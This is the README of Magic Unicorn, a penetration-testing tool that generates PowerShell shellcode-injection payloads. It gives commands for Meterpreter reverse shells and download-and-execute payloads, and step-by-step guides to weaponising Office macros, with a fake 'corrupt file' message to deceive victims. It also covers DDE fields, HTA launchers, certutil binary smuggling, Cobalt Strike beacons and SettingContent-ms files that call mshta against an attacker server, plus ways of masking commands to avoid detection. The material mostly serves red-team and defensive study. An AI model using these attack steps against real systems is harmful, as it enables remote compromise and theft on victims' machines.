unicorn
=======

Written by: Dave Kennedy (@HackingDave)
Website: https://www.trustedsec.com

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

Usage is simple, just run Magic Unicorn (ensure Metasploit is installed if using Metasploit methods and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system. Unicorn supports your own shellcode, cobalt strike, and Metasploit.
```
root@rel1k:~/Desktop# python unicorn.py 

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=

                
-------------------- Magic Unicorn Attack Vector -----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)
Help Menu: python unicorn.py --help
```

###                -----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

###                -----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
victim to thinking the excel document is corrupted. You should get a shell through powershell injection
after that.

If you are deploying this against Office365/2016+ versions of Word you need to modify the first line of 
the output from: Sub Auto_Open()
 
To: Sub AutoOpen()
 
The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

###                -----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

###                -----CERTUTIL Attack Instruction----

The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
machine through a fake certificate file. To use this attack, simply place an executable in the path of
unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
windows machine to convert it back to a binary.


###                -----Custom PS1 Attack Instructions----

This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.

Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.

Examples:

    python unicorn.py harmless.ps1
    python unicorn.py myfile.ps1 macro
    python unicorn.py muahahaha.ps1 macro 500

The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.




###                -----DDE Office COM Attack Instructions----

This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
ability to gain remote code execution without the need of macros. This attack was documented and full
instructions can be found at:

https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

In order to use this attack, run the following examples:

    python unicorn.py <payload> <lhost> <lport> dde
    python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde

Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
in the latter section).

In order to apply the payload, as an example (from sensepost article):

1. Open Word
2. Insert tab -> Quick Parts -> Field
3. Choose = (Formula) and click ok.
4. Once the field is inserted, you should now see "!Unexpected End of Formula"
5. Right-click the Field, choose "Toggle Field Codes"
6. Paste in the code from Unicorn
7. Save the Word document.

Once the office document is opened, you should receive a shell through powershell injection. Note
that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.

The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
we are limited to size restrictions. You will need to move the download.ps1 to a location that is
accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
directory that it has access to.

You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
as it has some great methods for not calling DDE at all.

###                -----Import Cobalt Strike Beacon----

This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.

Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
the file, cobalt_strike_file.cs. 

The export code will look something like this:

* length: 836 bytes */
byte[] buf = new byte[836] { 0xfc, etc

Next, for usage:

    python unicorn.py cobalt_strike_file.cs cs

The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.

There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
size. That means that from a command line argument perspective if you copy and paste you will hit the
8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
this is an issue, however if you are launching directly from PowerShell or other normal applications
this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
issues.

###                 -----Custom Shellcode Generation Method----

This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.

Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
following format or it will not work:

0x00,0x00,0x00 and so on.

Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
the size of 8191. This is the max command line argument size limit in Windows.

Usage:

    python uniocrn.py shellcode_formatted_properly.txt shellcode

Next simply copy the powershell command to something you have the ability for remote command execution.

NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
YOUR SHELLCODE IN THE TXT FILE.

There are some caveats with this attack. Note that if your payload size is large in nature it will not
fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
applications this is a non-problem.

A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:

    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;

For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
issues.

###                 -----SettingContent-ms Extension Method----


First, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):

https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

This method uses a specific file type called ".SettingContent-ms" which allows for the ability for both
direct loads from browsers (open + command execution) as well as extension type through embedding in 
office products. This one specifically will focus on extension type settings for command execution
within Unicorn's PowerShell attack vector.

There are multiple methods supported with this attack vector. Since there is a limited character size
with this attack, the method for deployment is an HTA. 

For a detailed understanding on weaponizing this attack visit:

https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

The steps you'll need to do to complete this attack is generate your .SettingContent-ms file from
either a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct
shellcode attacks.

The four methods below on usage: 

HTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  
HTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  
HTA Example SettingContent-ms: `python unicorn.py <patth_to_shellcode.txt>: shellcode ms`  
Generate .SettingContent-ms: `python unicorn.py ms`

The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
just a blank .SettingContent-ms file. 

When everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in
the default root Unicorn directory (if using the standalone file generation) or under the hta_attack/
folder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:

REPLACECOOLSTUFFHERE

With:

mshta http://<apache_server_ip_or_dns_name/Launcher.hta.

Then move the contents of the hta_attack to /var/www/html.

Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
then download the Unicorn HTA file which has the code execution capabilites. 

Special thanks and kudos to Matt Nelson for the awesome research

Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/

Usage: 

    python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
    python unicorn.py <cobalt_strike_file.cs cs ms
    python unicorn.py <patth_to_shellcode.txt>: shellcode ms
    python unicorn.py ms

